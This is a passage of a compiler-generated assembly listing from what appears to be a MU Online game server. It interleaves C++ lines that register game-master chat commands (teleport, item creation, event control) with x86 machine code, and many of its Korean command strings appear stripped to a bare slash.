  0024c	68 cb 00 00 00	 push	 203			; 000000cbH
  00251	68 c8 0b 00 00	 push	 3016			; 00000bc8H
  00256	b9 00 00 00 00	 mov	 ecx, OFFSET ?lMsg@@3VCMsg@@A ; lMsg
  0025b	ff 15 00 00 00
	00		 call	 DWORD PTR __imp_?Get@CMsg@@QAEPADH@Z
  00261	50		 push	 eax
  00262	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00265	83 c1 04	 add	 ecx, 4
  00268	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 217  : 	
; 218  : 	//    
; 219  : 	cCommand.Add("/move",			GMCMD_SETPOSITION,					AUTHORITY_ADMIN | AUTHORITY_EVENT_GM | AUTHORITY_USER);

  0026d	6a 23		 push	 35			; 00000023H
  0026f	6a 65		 push	 101			; 00000065H
  00271	68 00 00 00 00	 push	 OFFSET ??_C@_05PCNGDGBG@?1move@
  00276	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00279	83 c1 04	 add	 ecx, 4
  0027c	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 220  : 	cCommand.Add("/m",				GMCMD_SETPOSITION,					AUTHORITY_ADMIN | AUTHORITY_EVENT_GM | AUTHORITY_USER);

  00281	6a 23		 push	 35			; 00000023H
  00283	6a 65		 push	 101			; 00000065H
  00285	68 00 00 00 00	 push	 OFFSET ??_C@_02ODPMDCNK@?1m@
  0028a	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0028d	83 c1 04	 add	 ecx, 4
  00290	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 221  : 	cCommand.Add("/gmove",			GMCMD_SETPOSITION2,					AUTHORITY_ADMIN | AUTHORITY_EVENT_GM );

  00295	6a 22		 push	 34			; 00000022H
  00297	6a 71		 push	 113			; 00000071H
  00299	68 00 00 00 00	 push	 OFFSET ??_C@_06EIGIJLP@?1gmove@
  0029e	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  002a1	83 c1 04	 add	 ecx, 4
  002a4	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 222  : 
; 223  : 	cCommand.Add("/make",			GMCMD_ITEMCREATE,					AUTHORITY_ADMIN);

  002a9	6a 02		 push	 2
  002ab	6a 6b		 push	 107			; 0000006bH
  002ad	68 00 00 00 00	 push	 OFFSET ??_C@_05GPHHBAG@?1make@
  002b2	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  002b5	83 c1 04	 add	 ecx, 4
  002b8	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 224  : 
; 225  : 	cCommand.Add(lMsg.Get(3036),	UMCMD_TRADEOPTION,					AUTHORITY_EVENT_GM | AUTHORITY_USER);

  002bd	6a 21		 push	 33			; 00000021H
  002bf	68 cb 00 00 00	 push	 203			; 000000cbH
  002c4	68 dc 0b 00 00	 push	 3036			; 00000bdcH
  002c9	b9 00 00 00 00	 mov	 ecx, OFFSET ?lMsg@@3VCMsg@@A ; lMsg
  002ce	ff 15 00 00 00
	00		 call	 DWORD PTR __imp_?Get@CMsg@@QAEPADH@Z
  002d4	50		 push	 eax
  002d5	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  002d8	83 c1 04	 add	 ecx, 4
  002db	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 226  : 
; 227  : 
; 228  : 	// 
; 229  : 	cCommand.Add("/userstat",	GMCMD_USERSTAT,						AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  002e0	6a 22		 push	 34			; 00000022H
  002e2	68 d6 00 00 00	 push	 214			; 000000d6H
  002e7	68 00 00 00 00	 push	 OFFSET ??_C@_09PNMFKAIE@?1userstat@
  002ec	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  002ef	83 c1 04	 add	 ecx, 4
  002f2	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 230  : 	// 
; 231  : 	cCommand.Add("/trace",			GMCMD_USERTRAKING,					AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  002f7	6a 22		 push	 34			; 00000022H
  002f9	68 d7 00 00 00	 push	 215			; 000000d7H
  002fe	68 00 00 00 00	 push	 OFFSET ??_C@_06JJEGOPHB@?1trace@
  00303	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00306	83 c1 04	 add	 ecx, 4
  00309	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 232  : 	// 
; 233  : 	cCommand.Add("/userwatch",	GMCMD_USERWATCHNG,					AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  0030e	6a 22		 push	 34			; 00000022H
  00310	68 d8 00 00 00	 push	 216			; 000000d8H
  00315	68 00 00 00 00	 push	 OFFSET ??_C@_0L@KDDCLIK@?1userwatch@
  0031a	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0031d	83 c1 04	 add	 ecx, 4
  00320	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 234  : 
; 235  : 
; 236  : 
; 237  : #ifdef ADD_KUNDUN_CONTROL_20040923
; 238  : 	cCommand.Add("/",		GMCMD_NOTIFYKUNDUNHP,				AUTHORITY_ADMIN);

  00325	6a 02		 push	 2
  00327	68 40 01 00 00	 push	 320			; 00000140H
  0032c	68 00 00 00 00	 push	 OFFSET ??_C@_09OAOHLHFO@?1?D?o?$LF?P?$LL?s?E?B@
  00331	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00334	83 c1 04	 add	 ecx, 4
  00337	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 239  : 	cCommand.Add("/",			GMCMD_SETKUNDUNHP,					AUTHORITY_ADMIN);

  0033c	6a 02		 push	 2
  0033e	68 41 01 00 00	 push	 321			; 00000141H
  00343	68 00 00 00 00	 push	 OFFSET ??_C@_07ILODLNBC@?1?D?o?$LF?P?G?G@
  00348	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0034b	83 c1 04	 add	 ecx, 4
  0034e	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 240  : 	cCommand.Add("/",		GMCMD_SETKUNDUNREFILLHP,			AUTHORITY_ADMIN);

  00353	6a 02		 push	 2
  00355	68 42 01 00 00	 push	 322			; 00000142H
  0035a	68 00 00 00 00	 push	 OFFSET ??_C@_0M@POALKPHK@?1?D?o?$LF?P?H?$LI?$LK?$LJ?$LH?$KO@
  0035f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00362	83 c1 04	 add	 ecx, 4
  00365	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 241  : 	cCommand.Add("/",	GMCMD_SETKUNDUNREFILLHPSEC,			AUTHORITY_ADMIN);

  0036a	6a 02		 push	 2
  0036c	68 43 01 00 00	 push	 323			; 00000143H
  00371	68 00 00 00 00	 push	 OFFSET ??_C@_0BA@DDJDJNOB@?1?D?o?$LF?P?C?J?$LE?g?H?$LI?$LK?$LJ?$LH?$KO@
  00376	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00379	83 c1 04	 add	 ecx, 4
  0037c	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 242  : 	cCommand.Add("/",	GMCMD_SETKUNDUNREFILLHPTIME,		AUTHORITY_ADMIN);

  00381	6a 02		 push	 2
  00383	68 44 01 00 00	 push	 324			; 00000144H
  00388	68 00 00 00 00	 push	 OFFSET ??_C@_0O@FADBPHEL@?1?D?o?$LF?P?H?$LI?$LK?$LJ?$LN?C?$LA?$KD@
  0038d	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00390	83 c1 04	 add	 ecx, 4
  00393	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 243  : 	
; 244  : #endif
; 245  : 
; 246  : #ifdef CHINA_GM_EVENT	
; 247  : 	cCommand.Add(lMsg.Get(3037),	GMCMD_START_GMEVENT,				AUTHORITY_EVENT_GM );	
; 248  : #endif
; 249  : 
; 250  : #ifdef MODIFY_CHN_GMEVENT_TO_TAIWAN_GM_EVENT_20070906
; 251  : 	//  
; 252  : 	cCommand.Add(lMsg.Get(3040),	GMCMD_START_GMEVENT,				AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);
; 253  : #endif // MODIFY_CHN_GMEVENT_TO_TAIWAN_GM_EVENT_20070906	
; 254  : 
; 255  : #ifdef UPDATE_GM_FUNCTION_20070228		// command 
; 256  : 	#ifdef FOR_KOREA
; 257  : 	cCommand.Add("/",		GMCMD_INVISIBLE,					AUTHORITY_EVENT_GM);
; 258  : 	cCommand.Add("/",	GMCMD_REMOVE_INVISIBLE,				AUTHORITY_EVENT_GM);
; 259  : 	#else
; 260  : 	cCommand.Add("/hide_on",	GMCMD_INVISIBLE,					AUTHORITY_EVENT_GM);
; 261  : 	cCommand.Add("/hide_off",	GMCMD_REMOVE_INVISIBLE,				AUTHORITY_EVENT_GM);
; 262  : 	#endif	
; 263  : #endif
; 264  : 
; 265  : #ifdef ADD_HACKING_TOOL_BLOCK_20090311
; 266  : 	//     GM .
; 267  : 	cCommand.Add( "/",		GMCMD_ADD_HACKTOOL_MOVE_BLOCK,		AUTHORITY_ADMIN | AUTHORITY_EVENT_GM );
; 268  : 	cCommand.Add( "/",		GMCMD_MODIFY_HACKTOOL_MOVE_BLOCK,	AUTHORITY_ADMIN | AUTHORITY_EVENT_GM );
; 269  : 	cCommand.Add( "/",		GMCMD_REMOVE_HACKTOOL_MOVE_BLOCK,	AUTHORITY_ADMIN | AUTHORITY_EVENT_GM );
; 270  : 	cCommand.Add( "/",			GMCMD_STATISTICS_HACKTOOL,			AUTHORITY_ADMIN | AUTHORITY_EVENT_GM );
; 271  : #endif // ADD_HACKING_TOOL_BLOCK_20090311
; 272  : 
; 273  : #if (TESTSERVER == 1) || defined(FOR_TEMP_SERVER)
; 274  : 	
; 275  : #ifdef CASTLE_GM_COMMAND_20041222	//   
; 276  : #ifdef FOR_KOREA
; 277  : 	cCommand.Add("/",	GMCMD_CS_CHANGEOWNERGUILD,			0);
; 278  : 	cCommand.Add("/",	GMCMD_CS_SETSTATE_REGSIEGE,			0);
; 279  : 	cCommand.Add("/",	GMCMD_CS_SETSTATE_REGMARK,			0);
; 280  : 	cCommand.Add("/",		GMCMD_CS_SETSTATE_NOTIFY,			0);
; 281  : 	cCommand.Add("/",		GMCMD_CS_SETSTATE_STARTSIEGE,		0);
; 282  : 	cCommand.Add("/",		GMCMD_CS_SETSTATE_ENDSIEGE,			0);
; 283  : 	cCommand.Add("/",	GMCMD_CS_SETSTATE_GETOWNERGUILD,	0);
; 284  : 	cCommand.Add("/",	GMCMD_CS_SETSTATE_GETCASTLESTATE,	0);
; 285  : 	cCommand.Add("/",		GMCMD_CS_CHANGECSSIDE,				0);
; 286  : #else
; 287  : 	cCommand.Add("/cschangeowner",	GMCMD_CS_CHANGEOWNERGUILD,			0);
; 288  : 	cCommand.Add("/cssetregsiege",	GMCMD_CS_SETSTATE_REGSIEGE,			0);
; 289  : 	cCommand.Add("/cssetregmark",	GMCMD_CS_SETSTATE_REGMARK,			0);
; 290  : 	cCommand.Add("/cssetnotify",	GMCMD_CS_SETSTATE_NOTIFY,			0);
; 291  : 	cCommand.Add("/cssetstart",		GMCMD_CS_SETSTATE_STARTSIEGE,		0);
; 292  : 	cCommand.Add("/cssetend",		GMCMD_CS_SETSTATE_ENDSIEGE,			0);
; 293  : 	cCommand.Add("/cscurowner",		GMCMD_CS_SETSTATE_GETOWNERGUILD,	0);
; 294  : 	cCommand.Add("/cscurstate",		GMCMD_CS_SETSTATE_GETCASTLESTATE,	0);
; 295  : 	cCommand.Add("/cschangeside",	GMCMD_CS_CHANGECSSIDE,				0);
; 296  : #endif	
; 297  : #endif
; 298  : 
; 299  : //    
; 300  : #if TESTSERVER == 1
; 301  : 
; 302  : #ifdef CRYWOLF_GM_COMMAND_20050525	//  
; 303  : 	cCommand.Add("/crywolfready",	GMCMD_CRYWOLF_READY,				0);			// "/"
; 304  : 	cCommand.Add("/crywolfstart",	GMCMD_CRYWOLF_START,				0);			// "/"
; 305  : 	cCommand.Add("/crywolfend",		GMCMD_CRYWOLF_END,					0);			// "/"
; 306  : 	cCommand.Add("/crywolfshow",	GMCMD_CRYWOLF_NOTIFY_2,				0);			// "/"
; 307  : #endif //CRYWOLF_GM_COMMAND_20050525
; 308  : 
; 309  : #else // TESTSERVER(  )
; 310  : 
; 311  : #ifdef CRYWOLF_GM_COMMAND_20050525	//  
; 312  : 	// MODIFY_LOCALIZING_WTF_20060309  wtf   0.99.60 - 0.99.94
; 313  : 	cCommand.Add(lMsg.Get(3338),	GMCMD_CRYWOLF_READY,				0);			// "/"
; 314  : 	cCommand.Add(lMsg.Get(3339),	GMCMD_CRYWOLF_START,				0);			// "/"
; 315  : 	cCommand.Add(lMsg.Get(3340),	GMCMD_CRYWOLF_END,					0);			// "/"
; 316  : 	cCommand.Add(lMsg.Get(3341),	GMCMD_CRYWOLF_NOTIFY_2,				0);			// "/"
; 317  : #endif //CRYWOLF_GM_COMMAND_20050525
; 318  : 
; 319  : #endif // TESTSERVER
; 320  : 	
; 321  : #ifdef KANTURU_GM_COMMAND_20060709
; 322  : 	cCommand.Add( "/",		GMCMD_KANTURU_STANBY,						0);
; 323  : 	cCommand.Add( "/",			GMCMD_KANTURU_BATTLEOFMAYA,					0);
; 324  : 	cCommand.Add( "/1",			GMCMD_KANTURU_MAYA_MONSTER1,				0);
; 325  : 	cCommand.Add( "/1",					GMCMD_KANTURU_MAYA1,						0);
; 326  : 	cCommand.Add( "/2",			GMCMD_KANTURU_MAYA_MONSTER2,				0);
; 327  : 	cCommand.Add( "/2",					GMCMD_KANTURU_MAYA2,						0);
; 328  : 	cCommand.Add( "/3",			GMCMD_KANTURU_MAYA_MONSTER3,				0);
; 329  : 	cCommand.Add( "/3",					GMCMD_KANTURU_MAYA3,						0);
; 330  : 	cCommand.Add( "/3",				GMCMD_KANTURU_MAYA3_SUCCESS,				0);
; 331  : 	cCommand.Add( lMsg.Get( 3388 ),			GMCMD_KANTURU_MAYA_SUCCESS,					0);				// 20060830 WTF  "/"
; 332  : 	cCommand.Add( "/",				GMCMD_KANTURU_MAYA_FAIL,					0);
; 333  : 	cCommand.Add( "/",	GMCMD_KANTURU_BATTLEOFNIGHTMARE,			0);
; 334  : 	cCommand.Add( lMsg.Get( 3389 ),			GMCMD_KANTURU_BATTLEOFNIGHTMARE_SUCCESS,	0);	// 20060830 WTF  "/"
; 335  : 	cCommand.Add( "/",		GMCMD_KANTURU_BATTLEOFNIGHTMARE_FAIL,		0);
; 336  : 	cCommand.Add( "/",		GMCMD_KANTURU_TOWEROFREFINEMENT,			0);
; 337  : 	cCommand.Add( "/",			GMCMD_KANTURU_TOWER_OPEN,					0);
; 338  : 	cCommand.Add( "/",			GMCMD_KANTURU_TOWER_CLOSE,					0);
; 339  : 	cCommand.Add( "/",			GMCMD_KANTURU_END,							0);
; 340  : 	cCommand.Add( lMsg.Get( 3385 ),			GMCMD_KANTURU_NEXT_STATE,					0);					// 20060830 WTF  "/"
; 341  : 	cCommand.Add( lMsg.Get( 3386 ),			GMCMD_KANTURU_NEXT_DETAIL_STATE,			0);			// 20060830 WTF  "/"
; 342  : 	cCommand.Add( lMsg.Get( 3387 ),			GMCMD_KANTURU_CURRENT_STATE,				0);				// 20060830 WTF  "/"
; 343  : #endif	// #ifdef KANTURU_GM_COMMAND_20060709	
; 344  : 	
; 345  : #ifdef DARKLORD_WORK
; 346  : 	cCommand.Add("/",	GMCMD_DARKSPIRIT,					0);
; 347  : 	cCommand.Add("/",	GMCMD_DARKSPIRIT_LEVEL,		0);	
; 348  : #endif
; 349  : 	cCommand.Add("/",	GMCMD_STATRESET,				0);
; 350  : 	cCommand.Add("/",		GMCMD_SETLEVEL,					0);
; 351  : 	cCommand.Add("/",	GMCMD_QUESTRESET,				0);		
; 352  : 	
; 353  : #ifdef JS_ADD_TEST_COMMAND
; 354  : 	cCommand.Add("/",		GMCMD_INFORMITEMINDEX,			0);		
; 355  : 	cCommand.Add("/",	GMCMD_NOTICEALL ,				0);		
; 356  : 	cCommand.Add("/",		GMCMD_RESETZEN ,				0);		
; 357  : 	cCommand.Add("/",		GMCMD_SETPKLEVEL ,				0);		
; 358  : 	cCommand.Add("/",		GMCMD_SETPKPOINT,				0);		
; 359  : 	cCommand.Add("/",		GMCMD_NOTIFYMONSTERHP,			0);		
; 360  : 	cCommand.Add("/",		GMCMD_SET1004,					0);		
; 361  : 	
; 362  : #ifndef MAKE_ITEM_STOP
; 363  : 	cCommand.Add("/",	GMCMD_MODIFYSTAT,				0);		
; 364  : 	cCommand.Add("/STAT",		GMCMD_MODIFYSTAT_ENG,			0);		
; 365  : 	cCommand.Add("/",		GMCMD_CREATEITEMNAME,			0);		
; 366  : 	cCommand.Add("/",		GMCMD_MANYMANYCHAOS,			0);		
; 367  : 	cCommand.Add("/",		GMCMD_MANYMANYLIFE,				0);		
; 368  : 	cCommand.Add("/",		GMCMD_MANYMANYCREATE,			0);		
; 369  : 	cCommand.Add("/",		GMCMD_MANYMANYGEM,				0);		
; 370  : 	cCommand.Add("/",	GMCMD_MANYMANYITEM ,			0);		
; 371  : 	cCommand.Add("/",			GMCMD_CREATEPROPERTYITEM,		0);		
; 372  : 	cCommand.Add("/",		GMCMD_MANYMANYBLESS,			0);				
; 373  : 	cCommand.Add("/",		GMCMD_MANYMANYSOUL,				0);				
; 374  : 	cCommand.Add("/",		GMCMD_MAKESETITEM,				0);				
; 375  : 	cCommand.Add("/",	GMCMD_MAKERANDOMSETITEM,		0);
; 376  : #endif	// MAKE_ITEM_STOP
; 377  : 	
; 378  : #ifdef FOR_KOREA
; 379  : 	cCommand.Add("/",		GMCMD_CLASS_UP,					0);
; 380  : #ifdef THIRD_CHANGEUP_SYSTEM_20070507
; 381  : 	cCommand.Add( "/3",		GMCMD_THIRD_CHANGE_UP,			0);
; 382  : 	cCommand.Add( "/",	GMCMD_CHANGE_UP_ALL_RESET,		0);	
; 383  : 	cCommand.Add( "/",		GMCMD_QUEST_ITEM,				0);
; 384  : 	cCommand.Add( "/",	GMCMD_MANYMANY_ITEM,			0);	
; 385  : 	cCommand.Add( "/",	GMCMD_SET_QUEST,				0);
; 386  : 	cCommand.Add( "/",		GMCMD_SET_ZEN,					0);
; 387  : #endif
; 388  : #else
; 389  : 	cCommand.Add("/jobchange",			GMCMD_CLASS_UP,				0);
; 390  : #ifdef THIRD_CHANGEUP_SYSTEM_20070507
; 391  : 	cCommand.Add( "/jobchange3",		GMCMD_THIRD_CHANGE_UP,		0);
; 392  : 	cCommand.Add( "/jobchangereset",	GMCMD_CHANGE_UP_ALL_RESET,	0);	
; 393  : 	cCommand.Add( "/questitem",			GMCMD_QUEST_ITEM,			0);
; 394  : 	cCommand.Add( "/",			GMCMD_MANYMANY_ITEM,		0);	
; 395  : 	cCommand.Add( "/questsuccess",		GMCMD_SET_QUEST,			0);
; 396  : 	cCommand.Add( "/",				GMCMD_SET_ZEN,				0);
; 397  : #endif
; 398  : #endif // FOR_KOREA
; 399  : 	
; 400  : 	cCommand.Add("/",		GMCMD_FENRIR_DURSMALL_DEF,		0);
; 401  : 	cCommand.Add("/",		GMCMD_FENRIR_DURSMALL_ELF,		0);
; 402  : 	
; 403  : #ifdef ADD_SHIELD_POINT_01_20060403
; 404  : 	cCommand.Add("/",		GMCMD_SET_SHIELD_POINT,			0);
; 405  : 	cCommand.Add("/",		GMCMD_POINT_DISPLAY,			0);
; 406  : #endif
; 407  : 	
; 408  : #ifdef ITEM_ADD_OPTION_20061019
; 409  : 	cCommand.Add("/",		GMCMD_ITEM_EFFECT_SET,			0);
; 410  : 	cCommand.Add("/",		GMCMD_ITEM_EFFECT_CLEAR,		0);
; 411  : #endif
; 412  : #endif
; 413  : 	
; 414  : #ifdef ADD_MACRO_INIFINITY_ARROW_CONTROL_20060410
; 415  : 	cCommand.Add("/",		GMCMD_GETINFINITYARROW_MP,		0);
; 416  : 	cCommand.Add("/+0",		GMCMD_SETINFINITYARROW_MP_0,	0);
; 417  : 	cCommand.Add("/+1",		GMCMD_SETINFINITYARROW_MP_1,	0);
; 418  : 	cCommand.Add("/+2",		GMCMD_SETINFINITYARROW_MP_2,	0);
; 419  : 	cCommand.Add("/",		GMCMD_INFINITYARROW_SETTIME,	0);
; 420  : #endif
; 421  : 	
; 422  : #ifdef UPDATE_ADD_ARROW_TYPE_PLUS_3_20081106
; 423  : 	cCommand.Add("/+3",		GMCMD_SETINFINITYARROW_MP_3,	0);
; 424  : #endif // UPDATE_ADD_ARROW_TYPE_PLUS_3_20081106
; 425  : 	
; 426  : #ifdef MODIFY_LIFEANDMANA_BUG_LEVELUP_RELOGIN_20065018
; 427  : 	//	cCommand.Add("/", GMCMD_LEVELUP_TEST,	0);
; 428  : #endif
; 429  : 	
; 430  : #ifdef ADD_SKILL_DARKLOAD_FIRESCREAM_20060601
; 431  : 	cCommand.Add( "/",	GMCMD_FIRE_SCREAM,					0);
; 432  : #endif
; 433  : 	
; 434  : #ifdef ADD_JEWEL_OF_HARMONY_SYSTEM_20060530
; 435  : 	cCommand.Add("/", GMCMD_MAKE_STRENGTHENITEM,				0);
; 436  : #endif
; 437  : 	
; 438  : #ifdef ADD_380ITEM_NEWOPTION_20060711
; 439  : 	cCommand.Add("/", GMCMD_MAKE_380OPTIONITEM,				0);
; 440  : #endif
; 441  : 	
; 442  : #ifdef MODIFY_SEASON25_PCS_UNIFICATION_20070903
; 443  : 	cCommand.Add("/", GMCMD_LOTTERY_ITEM_CREATE,				0);
; 444  : #endif // MODIFY_SEASON25_PCS_UNIFICATION_20070903
; 445  : 	
; 446  : #ifdef MODIFY_INVEN_CLEAR_MACRO_20071212
; 447  : 	cCommand.Add("/", GMCMD_INVENTORY_ITEM_DELETE,				0);
; 448  : 	cCommand.Add("/", GMCMD_INVENTORY_ITEM_ALL_DELETE,	AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);
; 449  : 	cCommand.Add("/DQTime", GMCMD_DEVILSQUARE_SET_TIME,				0);
; 450  : #endif // MODIFY_INVEN_CLEAR_MACRO_20071212
; 451  : 	
; 452  : 	
; 453  : #ifdef FOR_ONAIR
; 454  : #ifdef ADD_MACRO_FOR_SETITEM_20060424
; 455  : 	cCommand.Add("/",	GMCMD_SETLEVEL,						0);
; 456  : 	cCommand.Add("/",	GMCMD_STATRESET,				0);
; 457  : #endif
; 458  : #endif
; 459  : 	
; 460  : #ifdef ADD_EVENT_MAP_ILLUSION_TEMPLE_20070328	//    
; 461  : #ifdef FOR_KOREA
; 462  : 	cCommand.Add("/",				GMCMD_ILLUSION_TEMPLE_READY,		0);
; 463  : 	cCommand.Add("/",				GMCMD_ILLUSION_TEMPLE_START,		0);
; 464  : 	cCommand.Add("/",				GMCMD_ILLUSION_TEMPLE_END,			0);
; 465  : 	//	cCommand.Add("/IllusionTempleReset",	GMCMD_ILLUSION_TEMPLE_RESET);
; 466  : #else
; 467  : 	cCommand.Add("/templeready",			GMCMD_ILLUSION_TEMPLE_READY,		0);
; 468  : 	cCommand.Add("/templestart",			GMCMD_ILLUSION_TEMPLE_START,		0);
; 469  : 	cCommand.Add("/templeend",				GMCMD_ILLUSION_TEMPLE_END,			0);
; 470  : 	//	cCommand.Add("/templereset",			GMCMD_ILLUSION_TEMPLE_RESET);
; 471  : #endif // FOR_KOREA
; 472  : #endif
; 473  : 	
; 474  : #ifdef ADD_MASTER_LEVEL_SYSTEM_COMMAND_20071122		// command 
; 475  : 	cCommand.Add( "/masterlevel",				GMCMD_MASTERLEVEL_LEVELUP,		0);
; 476  : 	cCommand.Add( "/mlpoint",					GMCMD_MASTERLEVEL_POINT,		0);
; 477  : 	cCommand.Add( "/ms_reset",					GMCMD_MASTERLEVEL_SKILL_RESET,	0);
; 478  : #endif
; 479  : 	
; 480  : #ifdef ADD_ITEM_SOCKET_OPTION_SYSTEM_20080415
; 481  : 	cCommand.Add( "/setsocket",					GMCMD_SET_SOCKET_OPTION,		0);	//<<<<<<shit
; 482  : 	cCommand.Add( "/clearsocket",				GMCMD_CLEAR_SOCKET_OPTION,		0);	//<<<<<<shit
; 483  : #ifdef MODIFY_ITEM_SOCKET_OPTION_BUGFIX_04_20080710
; 484  : 	cCommand.Add( "/makesocketslot",			GMCMD_MAKE_SOCKET_SLOT,			0);	//<<<<<<shit
; 485  : #endif // MODIFY_ITEM_SOCKET_OPTION_BUGFIX_04_20080710
; 486  : #endif // ADD_ITEM_SOCKET_OPTION_SYSTEM_20080415
; 487  : 	
; 488  : #ifdef ADD_RAKLION_20080408
; 489  : 	cCommand.Add( "/",			GMCMD_RAKLION_IDLE,					0);
; 490  : 	cCommand.Add( "/1",			GMCMD_RAKLION_NOTIFY_1,				0);
; 491  : 	cCommand.Add( "/",		GMCMD_RAKLION_STANDBY,				0);
; 492  : 	cCommand.Add( "/2",			GMCMD_RAKLION_NOTIFY_2,				0);
; 493  : 	cCommand.Add( "/",			GMCMD_RAKLION_READY,				0);
; 494  : 	cCommand.Add( "/",			GMCMD_RAKLION_START_BATTLE,			0);
; 495  : 	cCommand.Add( "/3",			GMCMD_RAKLION_NOTIFY_3,				0);
; 496  : 	cCommand.Add( "/",			GMCMD_RAKLION_CLOSE_DOOR,			0);
; 497  : 	cCommand.Add( "/",			GMCMD_RAKLION_ALL_USER_DIE,			0);
; 498  : 	cCommand.Add( "/4",			GMCMD_RAKLION_NOTIFY_4,				0);
; 499  : 	cCommand.Add( "/",			GMCMD_RAKLION_END,					0);
; 500  : 	cCommand.Add( "/1",			GMCMD_RAKLION_SELUPAN_1,			0);
; 501  : 	cCommand.Add( "/2",			GMCMD_RAKLION_SELUPAN_2,			0);
; 502  : 	cCommand.Add( "/3",			GMCMD_RAKLION_SELUPAN_3,			0);
; 503  : 	cCommand.Add( "/4",			GMCMD_RAKLION_SELUPAN_4,			0);
; 504  : 	cCommand.Add( "/5",			GMCMD_RAKLION_SELUPAN_5,			0);
; 505  : 	cCommand.Add( "/6",			GMCMD_RAKLION_SELUPAN_6,			0);
; 506  : 	cCommand.Add( "/7",			GMCMD_RAKLION_SELUPAN_7,			0);
; 507  : 	cCommand.Add( "/",		GMCMD_RAKLION_FIRST_SKILL,			0);
; 508  : 	cCommand.Add( "/",			GMCMD_RAKLION_POISON_ATTACK,		0);
; 509  : 	cCommand.Add( "/",		GMCMD_RAKLION_ICE_STORM,			0);
; 510  : 	cCommand.Add( "/",		GMCMD_RAKLION_ICE_STRIKE,			0);
; 511  : 	cCommand.Add( "/",			GMCMD_RAKLION_SUMMON_MONSTER,		0);
; 512  : 	cCommand.Add( "/",				GMCMD_RAKLION_HEAL,					0);
; 513  : 	cCommand.Add( "/",			GMCMD_RAKLION_FREEZE,				0);
; 514  : 	cCommand.Add( "/",		GMCMD_RAKLION_TELEPORT_RANDOM,		0);
; 515  : 	cCommand.Add( "/",			GMCMD_RAKLION_INVINCIBILITY,		0);
; 516  : #endif // ADD_RAKLION_20080408
; 517  : 
; 518  : #ifdef MODIFY_SPEEDHACK_20080605
; 519  : 	cCommand.Add( "/abilitydebug",			GMCMD_ABILITY_DEBUG,				0);
; 520  : #endif // MODIFY_SPEEDHACK_20080605
; 521  : 
; 522  : #ifdef ADD_ITEM_ATTACK_XMASEVENT_20081014
; 523  : 	cCommand.Add( "/xmaseventstart",		GMCMD_XMASEVENT_START,				0);
; 524  : #endif // ADD_ITEM_ATTACK_XMASEVENT_20081014
; 525  : 
; 526  : #ifdef ADD_GIFTITEM_XMASEVENT_20081030
; 527  : 	//        .  by natinda
; 528  : 	cCommand.Add( "/SetVisitorCount", GMCMD_XMASEVENT_SETVISITORCNT,			0);
; 529  : 	cCommand.Add( "/SetVisitorMode",GMCMD_XMASEVENT_SETSANTAMODE,				0); 
; 530  : #endif//ADD_GIFTITEM_XMASEVENT_20081030
; 531  : 	
; 532  : #ifdef ADD_NEWPVP_PKFIELD
; 533  : 	cCommand.Add( "/",				GMCMD_NEWPVP_OBSERVER,				0);
; 534  : 	cCommand.Add( "/",					GMCMD_NEWPVP_GLORYOFGLADIATOR,		0);
; 535  : #endif // ADD_NEWPVP_PKFIELD
; 536  : 	
; 537  : #ifdef PCBANG_POINT_SYSTEM_20070206
; 538  : 	cCommand.Add( "/addpcbangpoint",		GMCMD_ADD_PCBANG_POINT,				0);
; 539  : 	cCommand.Add( "/resetpcbangpoint",		GMCMD_RESET_PCBANG_POINT,			0);
; 540  : #endif // PCBANG_POINT_SYSTEM_20070206
; 541  : 
; 542  : #endif	// #if (TESTSERVER==1)
; 543  : 
; 544  : 	cCommand.Add( "/time",					GMCMD_TIME,							AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  00398	6a 23		 push	 35			; 00000023H
  0039a	68 c4 01 00 00	 push	 452			; 000001c4H
  0039f	68 00 00 00 00	 push	 OFFSET ??_C@_05KKDONAKI@?1time@
  003a4	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  003a7	83 c1 04	 add	 ecx, 4
